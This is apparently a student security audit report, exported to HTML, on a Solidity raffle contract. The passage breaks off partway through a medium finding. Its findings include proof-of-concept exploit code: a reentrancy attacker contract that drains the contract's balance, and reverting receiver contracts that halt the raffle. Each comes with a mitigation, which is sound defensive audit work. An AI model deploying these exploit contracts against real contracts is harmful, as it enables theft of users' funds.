@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>findings.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="puppy-raffle-audit-report">Puppy Raffle Audit Report</h1>
+<p>Prepared by: marvellous
+Lead Auditors:</p>
+<ul>
+<li><a href="https://github.com/marvy-codes">MarvyCodes</a></li>
+</ul>
+<p>Assisting Auditors:</p>
+<ul>
+<li>None</li>
+</ul>
+<h1 id="table-of-contents">Table of contents</h1>
+<details>
+</details><summary>See table</summary>
+<ul>
+<li><a href="#puppy-raffle-audit-report">Puppy Raffle Audit Report</a></li>
+<li><a href="#table-of-contents">Table of contents</a></li>
+<li><a href="#about-your_name_here">About YOUR_NAME_HERE</a></li>
+<li><a href="#disclaimer">Disclaimer</a></li>
+<li><a href="#risk-classification">Risk Classification</a></li>
+<li><a href="#audit-details">Audit Details</a>
+<ul>
+<li><a href="#scope">Scope</a></li>
+</ul>
+</li>
+<li><a href="#protocol-summary">Protocol Summary</a>
+<ul>
+<li><a href="#roles">Roles</a></li>
+</ul>
+</li>
+<li><a href="#executive-summary">Executive Summary</a>
+<ul>
+<li><a href="#issues-found">Issues found</a></li>
+</ul>
+</li>
+<li><a href="#findings">Findings</a>
+<ul>
+<li><a href="#high">High</a>
+<ul>
+<li><a href="#h-1-reentrancy-attack-in-puppyrafflerefund-allows-entrant-to-drain-contract-balance">[H-1] Reentrancy attack in <code>PuppyRaffle::refund</code> allows entrant to drain contract balance</a></li>
+<li><a href="#h-2-weak-randomness-in-puppyraffleselectwinner-allows-anyone-to-choose-winner">[H-2] Weak randomness in <code>PuppyRaffle::selectWinner</code> allows anyone to choose winner</a></li>
+<li><a href="#h-3-integer-overflow-of-puppyraffletotalfees-loses-fees">[H-3] Integer overflow of <code>PuppyRaffle::totalFees</code> loses fees</a></li>
+<li><a href="#h-4-malicious-winner-can-forever-halt-the-raffle">[H-4] Malicious winner can forever halt the raffle</a></li>
+</ul>
+</li>
+<li><a href="#medium">Medium</a>
+<ul>
+<li><a href="#m-1-looping-through-players-array-to-check-for-duplicates-in-puppyraffleenterraffle-is-a-potential-dos-vector-incrementing-gas-costs-for-future-entrants">[M-1] Looping through players array to check for duplicates in <code>PuppyRaffle::enterRaffle</code> is a potential DoS vector, incrementing gas costs for future entrants</a></li>
+<li><a href="#m-2-balance-check-on-puppyrafflewithdrawfees-enables-griefers-to-selfdestruct-a-contract-to-send-eth-to-the-raffle-blocking-withdrawals">[M-2] Balance check on <code>PuppyRaffle::withdrawFees</code> enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals</a></li>
+<li><a href="#m-3-unsafe-cast-of-puppyrafflefee-loses-fees">[M-3] Unsafe cast of <code>PuppyRaffle::fee</code> loses fees</a></li>
+<li><a href="#m-4-smart-contract-wallet-raffle-winners-without-a-receive-or-a-fallback-will-block-the-start-of-a-new-contest">[M-4] Smart Contract wallet raffle winners without a <code>receive</code> or a <code>fallback</code> will block the start of a new contest</a></li>
+</ul>
+</li>
+<li><a href="#informational--non-critical">Informational / Non-Critical</a>
+<ul>
+<li><a href="#i-1-floating-pragmas">[I-1] Floating pragmas</a></li>
+<li><a href="#i-2-magic-numbers">[I-2] Magic Numbers</a></li>
+<li><a href="#i-3-test-coverage">[I-3] Test Coverage</a></li>
+<li><a href="#i-4-zero-address-validation">[I-4] Zero address validation</a></li>
+<li><a href="#i-5-_isactiveplayer-is-never-used-and-should-be-removed">[I-5] _isActivePlayer is never used and should be removed</a></li>
+<li><a href="#i-6-unchanged-variables-should-be-constant-or-immutable">[I-6] Unchanged variables should be constant or immutable</a></li>
+<li><a href="#i-7-potentially-erroneous-active-player-index">[I-7] Potentially erroneous active player index</a></li>
+<li><a href="#i-8-zero-address-may-be-erroneously-considered-an-active-player">[I-8] Zero address may be erroneously considered an active player</a></li>
+</ul>
+</li>
+<li><a href="#gas-optional">Gas (Optional)</a></li>
+</ul>
+</li>
+</ul>
+
+<br>
+<h1 id="about-yournamehere">About YOUR_NAME_HERE</h1>
+<!-- Tell people about you! -->
+<h1 id="disclaimer">Disclaimer</h1>
+<p>I made all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the the findings provided in this document. A security audit is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the solidity implementation of the contracts.</p>
+<h1 id="risk-classification">Risk Classification</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th>Impact</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td>High</td>
+<td>Medium</td>
+<td>Low</td>
+</tr>
+<tr>
+<td></td>
+<td>High</td>
+<td>H</td>
+<td>H/M</td>
+<td>M</td>
+</tr>
+<tr>
+<td>Likelihood</td>
+<td>Medium</td>
+<td>H/M</td>
+<td>M</td>
+<td>M/L</td>
+</tr>
+<tr>
+<td></td>
+<td>Low</td>
+<td>M</td>
+<td>M/L</td>
+<td>L</td>
+</tr>
+</tbody>
+</table>
+<h1 id="audit-details">Audit Details</h1>
+<p><strong>The findings described in this document correspond the following commit hash:</strong></p>
+<pre class="hljs"><code><div>22bbbb2c47f3f2b78c1b134590baf41383fd354f
+</div></code></pre>
+<h2 id="scope">Scope</h2>
+<pre class="hljs"><code><div>./src/
+-- PuppyRaffle.sol
+</div></code></pre>
+<h1 id="protocol-summary">Protocol Summary</h1>
+<p>Puppy Rafle is a protocol dedicated to raffling off puppy NFTs with variying rarities. A portion of entrance fees go to the winner, and a fee is taken by another address decided by the protocol owner.</p>
+<h2 id="roles">Roles</h2>
+<ul>
+<li>Owner: The only one who can change the <code>feeAddress</code>, denominated by the <code>_owner</code> variable.</li>
+<li>Fee User: The user who takes a cut of raffle entrance fees. Denominated by the <code>feeAddress</code> variable.</li>
+<li>Raffle Entrant: Anyone who enters the raffle. Denominated by being in the <code>players</code> array.</li>
+</ul>
+<h1 id="executive-summary">Executive Summary</h1>
+<h2 id="issues-found">Issues found</h2>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Number of issues found</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>High</td>
+<td>4</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>3</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>0</td>
+</tr>
+<tr>
+<td>Info</td>
+<td>8</td>
+</tr>
+<tr>
+<td>Total</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<h1 id="findings">Findings</h1>
+<h2 id="high">High</h2>
+<h3 id="h-1-reentrancy-attack-in-puppyrafflerefund-allows-entrant-to-drain-contract-balance">[H-1] Reentrancy attack in <code>PuppyRaffle::refund</code> allows entrant to drain contract balance</h3>
+<p><strong>Description:</strong> The <code>PuppyRaffle::refund</code> function does not follow <a href="https://www.nascent.xyz/idea/youre-writing-require-statements-wrong">CEI/FREI-PI</a> and as a result, enables participants to drain the contract balance.</p>
+<p>In the <code>PuppyRaffle::refund</code> function, we first make an external call to the <code>msg.sender</code> address, and only after making that external call, we update the <code>players</code> array.</p>
+<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refund</span>(<span class="hljs-params">uint256 playerIndex</span>) <span class="hljs-title">public</span> </span>{
+    address playerAddress = players[playerIndex];
+    <span class="hljs-built_in">require</span>(playerAddress == msg.sender, <span class="hljs-string">"PuppyRaffle: Only the player can refund"</span>);
+    <span class="hljs-built_in">require</span>(playerAddress != address(<span class="hljs-number">0</span>), <span class="hljs-string">"PuppyRaffle: Player already refunded, or is not active"</span>);
+
+@&gt;  payable(msg.sender).sendValue(entranceFee);
+
+@&gt;  players[playerIndex] = address(<span class="hljs-number">0</span>);
+    emit RaffleRefunded(playerAddress);
+}
+</div></code></pre>
+<p>A player who has entered the raffle could have a <code>fallback</code>/<code>receive</code> function that calls the <code>PuppyRaffle::refund</code> function again and claim another refund. They could continue to cycle this until the contract balance is drained.</p>
+<p><strong>Impact:</strong> All fees paid by raffle entrants could be stolen by the malicious participant.</p>
+<p><strong>Proof of Concept:</strong></p>
+<ol>
+<li>Users enters the raffle.</li>
+<li>Attacker sets up a contract with a <code>fallback</code> function that calls <code>PuppyRaffle::refund</code>.</li>
+<li>Attacker enters the raffle</li>
+<li>Attacker calls <code>PuppyRaffle::refund</code> from their contract, draining the contract balance.</li>
+</ol>
+<p><strong>Proof of Code:</strong></p>
+<details>
+<summary>Code</summary>
+Add the following code to the `PuppyRaffleTest.t.sol` file. 
+</details><pre class="hljs"><code><div>contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    <span class="hljs-keyword">constructor</span>(address _puppyRaffle) {
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> </span>{
+        address[] memory players = <span class="hljs-keyword">new</span> address[](<span class="hljs-number">1</span>);
+        players[<span class="hljs-number">0</span>] = address(<span class="hljs-keyword">this</span>);
+        puppyRaffle.enterRaffle{<span class="hljs-attr">value</span>: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(<span class="hljs-keyword">this</span>));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    fallback() external payable {
+        <span class="hljs-keyword">if</span> (address(puppyRaffle).balance &gt;= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testReentrance</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">playersEntered</span> </span>{
+    ReentrancyAttacker attacker = <span class="hljs-keyword">new</span> ReentrancyAttacker(address(puppyRaffle));
+    vm.deal(address(attacker), <span class="hljs-number">1e18</span>);
+    uint256 startingAttackerBalance = address(attacker).balance;
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+
+    attacker.attack();
+
+    uint256 endingAttackerBalance = address(attacker).balance;
+    uint256 endingContractBalance = address(puppyRaffle).balance;
+    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
+    assertEq(endingContractBalance, <span class="hljs-number">0</span>);
+}
+</div></code></pre>
+
+<p><strong>Recommended Mitigation:</strong> To fix this, we should have the <code>PuppyRaffle::refund</code> function update the <code>players</code> array before making the external call. Additionally, we should move the event emission up as well.</p>
+<pre class="hljs"><code><div>    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+<span class="hljs-addition">+       players[playerIndex] = address(0);</span>
+<span class="hljs-addition">+       emit RaffleRefunded(playerAddress);</span>
+        (bool success,) = msg.sender.call{value: entranceFee}("");
+        require(success, "PuppyRaffle: Failed to refund player");
+<span class="hljs-deletion">-        players[playerIndex] = address(0);</span>
+<span class="hljs-deletion">-        emit RaffleRefunded(playerAddress);</span>
+    }
+</div></code></pre>
+<h3 id="h-2-weak-randomness-in-puppyraffleselectwinner-allows-anyone-to-choose-winner">[H-2] Weak randomness in <code>PuppyRaffle::selectWinner</code> allows anyone to choose winner</h3>
+<p><strong>Description:</strong> Hashing <code>msg.sender</code>, <code>block.timestamp</code>, <code>block.difficulty</code> together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.</p>
+<p><strong>Impact:</strong> Any user can choose the winner of the raffle, winning the money and selecting the &quot;rarest&quot; puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.</p>
+<p><strong>Proof of Concept:</strong></p>
+<p>There are a few attack vectors here.</p>
+<ol>
+<li>Validators can know ahead of time the <code>block.timestamp</code> and <code>block.difficulty</code> and use that knowledge to predict when / how to participate. See the <a href="https://soliditydeveloper.com/prevrandao">solidity blog on prevrando</a> here. <code>block.difficulty</code> was recently replaced with <code>prevrandao</code>.</li>
+<li>Users can manipulate the <code>msg.sender</code> value to result in their index being the winner.</li>
+</ol>
+<p>Using on-chain values as a randomness seed is a <a href="https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf">well-known attack vector</a> in the blockchain space.</p>
+<p><strong>Recommended Mitigation:</strong> Consider using an oracle for your randomness like <a href="https://docs.chain.link/vrf/v2/introduction">Chainlink VRF</a>.</p>
+<h3 id="h-3-integer-overflow-of-puppyraffletotalfees-loses-fees">[H-3] Integer overflow of <code>PuppyRaffle::totalFees</code> loses fees</h3>
+<p><strong>Description:</strong> In Solidity versions prior to <code>0.8.0</code>, integers were subject to integer overflows.</p>
+<pre class="hljs"><code><div>uint64 myVar = type(uint64).max; 
+<span class="hljs-comment">// myVar will be 18446744073709551615</span>
+myVar = myVar + <span class="hljs-number">1</span>;
+<span class="hljs-comment">// myVar will be 0</span>
+</div></code></pre>
+<p><strong>Impact:</strong> In <code>PuppyRaffle::selectWinner</code>, <code>totalFees</code> are accumulated for the <code>feeAddress</code> to collect later in <code>withdrawFees</code>. However, if the <code>totalFees</code> variable overflows, the <code>feeAddress</code> may not collect the correct amount of fees, leaving fees permanently stuck in the contract.</p>
+<p><strong>Proof of Concept:</strong></p>
+<ol>
+<li>We first conclude a raffle of 4 players to collect some fees.</li>
+<li>We then have 89 additional players enter a new raffle, and we conclude that raffle as well.</li>
+<li><code>totalFees</code> will be:</li>
+</ol>
+<pre class="hljs"><code><div>totalFees = totalFees + uint64(fee);
+<span class="hljs-comment">// substituted</span>
+totalFees = <span class="hljs-number">800000000000000000</span> + <span class="hljs-number">17800000000000000000</span>;
+<span class="hljs-comment">// due to overflow, the following is now the case</span>
+totalFees = <span class="hljs-number">153255926290448384</span>;
+</div></code></pre>
+<ol start="4">
+<li>You will now not be able to withdraw, due to this line in <code>PuppyRaffle::withdrawFees</code>:</li>
+</ol>
+<pre class="hljs"><code><div><span class="hljs-built_in">require</span>(address(<span class="hljs-keyword">this</span>).balance == uint256(totalFees), <span class="hljs-string">"PuppyRaffle: There are currently players active!"</span>);
+</div></code></pre>
+<p>Although you could use <code>selfdestruct</code> to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.</p>
+<details>
+<summary>Proof Of Code</summary>
+Place this into the `PuppyRaffleTest.t.sol` file.
+</details><pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testTotalFeesOverflow</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">playersEntered</span> </span>{
+        <span class="hljs-comment">// We finish a raffle of 4 to collect some fees</span>
+        vm.warp(block.timestamp + duration + <span class="hljs-number">1</span>);
+        vm.roll(block.number + <span class="hljs-number">1</span>);
+        puppyRaffle.selectWinner();
+        uint256 startingTotalFees = puppyRaffle.totalFees();
+        <span class="hljs-comment">// startingTotalFees = 800000000000000000</span>
+
+        <span class="hljs-comment">// We then have 89 players enter a new raffle</span>
+        uint256 playersNum = <span class="hljs-number">89</span>;
+        address[] memory players = <span class="hljs-keyword">new</span> address[](playersNum);
+        <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{<span class="hljs-attr">value</span>: entranceFee * playersNum}(players);
+        <span class="hljs-comment">// We end the raffle</span>
+        vm.warp(block.timestamp + duration + <span class="hljs-number">1</span>);
+        vm.roll(block.number + <span class="hljs-number">1</span>);
+
+        <span class="hljs-comment">// And here is where the issue occurs</span>
+        <span class="hljs-comment">// We will now have fewer fees even though we just finished a second raffle</span>
+        puppyRaffle.selectWinner();
+
+        uint256 endingTotalFees = puppyRaffle.totalFees();
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"ending total fees"</span>, endingTotalFees);
+        assert(endingTotalFees &lt; startingTotalFees);
+
+        <span class="hljs-comment">// We are also unable to withdraw any fees because of the require check</span>
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert(<span class="hljs-string">"PuppyRaffle: There are currently players active!"</span>);
+        puppyRaffle.withdrawFees();
+    }
+</div></code></pre>
+
+<p><strong>Recommended Mitigation:</strong> There are a few recommended mitigations here.</p>
+<ol>
+<li>Use a newer version of Solidity that does not allow integer overflows by default.</li>
+</ol>
+<pre class="hljs"><code><div><span class="hljs-deletion">- pragma solidity ^0.7.6;</span>
+<span class="hljs-addition">+ pragma solidity ^0.8.18;</span>
+</div></code></pre>
+<p>Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's <code>SafeMath</code> to prevent integer overflows.</p>
+<ol start="2">
+<li>Use a <code>uint256</code> instead of a <code>uint64</code> for <code>totalFees</code>.</li>
+</ol>
+<pre class="hljs"><code><div><span class="hljs-deletion">- uint64 public totalFees = 0;</span>
+<span class="hljs-addition">+ uint256 public totalFees = 0;</span>
+</div></code></pre>
+<ol start="3">
+<li>Remove the balance check in <code>PuppyRaffle::withdrawFees</code></li>
+</ol>
+<pre class="hljs"><code><div><span class="hljs-deletion">- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");</span>
+</div></code></pre>
+<p>We additionally want to bring your attention to another attack vector as a result of this line in a future finding.</p>
+<h3 id="h-4-malicious-winner-can-forever-halt-the-raffle">[H-4] Malicious winner can forever halt the raffle</h3>
+<!-- TODO: This is not accurate, but there are some issues. This is likely a low. Users who don't have a fallback can't get their money and the TX will fail. -->
+<p><strong>Description:</strong> Once the winner is chosen, the <code>selectWinner</code> function sends the prize to the the corresponding address with an external call to the winner account.</p>
+<pre class="hljs"><code><div>(bool success,) = winner.call{<span class="hljs-attr">value</span>: prizePool}(<span class="hljs-string">""</span>);
+<span class="hljs-built_in">require</span>(success, <span class="hljs-string">"PuppyRaffle: Failed to send prize pool to winner"</span>);
+</div></code></pre>
+<p>If the <code>winner</code> account were a smart contract that did not implement a payable <code>fallback</code> or <code>receive</code> function, or these functions were included but reverted, the external call above would fail, and execution of the <code>selectWinner</code> function would halt. Therefore, the prize would never be distributed and the raffle would never be able to start a new round.</p>
+<p>There's another attack vector that can be used to halt the raffle, leveraging the fact that the <code>selectWinner</code> function mints an NFT to the winner using the <code>_safeMint</code> function. This function, inherited from the <code>ERC721</code> contract, attempts to call the <code>onERC721Received</code> hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.</p>
+<p>Therefore, an attacker can register a smart contract in the raffle that does not implement the <code>onERC721Received</code> hook expected. This will prevent minting the NFT and will revert the call to <code>selectWinner</code>.</p>
+<p><strong>Impact:</strong> In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.</p>
+<p><strong>Proof of Concept:</strong></p>
+<details>
+<summary>Proof Of Code</summary>
+Place the following test into `PuppyRaffleTest.t.sol`.
+</details><pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testSelectWinnerDoS</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+    vm.warp(block.timestamp + duration + <span class="hljs-number">1</span>);
+    vm.roll(block.number + <span class="hljs-number">1</span>);
+
+    address[] memory players = <span class="hljs-keyword">new</span> address[](<span class="hljs-number">4</span>);
+    players[<span class="hljs-number">0</span>] = address(<span class="hljs-keyword">new</span> AttackerContract());
+    players[<span class="hljs-number">1</span>] = address(<span class="hljs-keyword">new</span> AttackerContract());
+    players[<span class="hljs-number">2</span>] = address(<span class="hljs-keyword">new</span> AttackerContract());
+    players[<span class="hljs-number">3</span>] = address(<span class="hljs-keyword">new</span> AttackerContract());
+    puppyRaffle.enterRaffle{<span class="hljs-attr">value</span>: entranceFee * <span class="hljs-number">4</span>}(players);
+
+    vm.expectRevert();
+    puppyRaffle.selectWinner();
+}
+</div></code></pre>
+<p>For example, the <code>AttackerContract</code> can be this:</p>
+<pre class="hljs"><code><div>contract AttackerContract {
+    <span class="hljs-comment">// Implements a `receive` function that always reverts</span>
+    receive() external payable {
+        revert();
+    }
+}
+</div></code></pre>
+<p>Or this:</p>
+<pre class="hljs"><code><div>contract AttackerContract {
+    <span class="hljs-comment">// Implements a `receive` function to receive prize, but does not implement `onERC721Received` hook to receive the NFT.</span>
+    receive() external payable {}
+}
+</div></code></pre>
+
+<p><strong>Recommended Mitigation:</strong> Favor pull-payments over push-payments. This means modifying the <code>selectWinner</code> function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of <code>selectWinner</code>.</p>
+<h2 id="medium">Medium</h2>
+<h3 id="m-1-looping-through-players-array-to-check-for-duplicates-in-puppyraffleenterraffle-is-a-potential-dos-vector-incrementing-gas-costs-for-future-entrants">[M-1] Looping through players array to check for duplicates in <code>PuppyRaffle::enterRaffle</code> is a potential DoS vector, incrementing gas costs for future entrants</h3>
+<p><strong>Description:</strong> The <code>PuppyRaffle::enterRaffle</code> function loops through the <code>players</code> array to check for duplicates. However, the longer the <code>PuppyRaffle:players</code> array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the <code>players</code> array, is an additional check the loop will have to make.</p>
+<p><strong>Note to students: This next line would likely be it's own finding itself. However, we haven't taught you about MEV yet, so we are going to ignore it.</strong>
+Additionally, this increased gas cost creates front-running opportunities where malicious users can front-run another raffle entrant's transaction, increasing its costs, so their enter transaction fails.</p>
+<p><strong>Impact:</strong> The impact is two-fold.</p>
+<ol>
+<li>The gas costs for raffle entrants will greatly increase as more players enter the raffle.</li>
+<li>Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.</li>
+</ol>
+<p><strong>Proof of Concept:</strong></p>
+<p>If we have 2 sets of 100 players enter, the gas costs will be as such:</p>
+<ul>
+<li>1st 100 players: 6252039</li>
+<li>2nd 100 players: 18067741</li>
+</ul>
+<p>This is more than 3x as expensive for the second set of 100 players!</p>
+<p>This is due to the for loop in the <code>PuppyRaffle::enterRaffle</code> function.</p>
+<pre class="hljs"><code><div>        <span class="hljs-comment">// Check for duplicates</span>
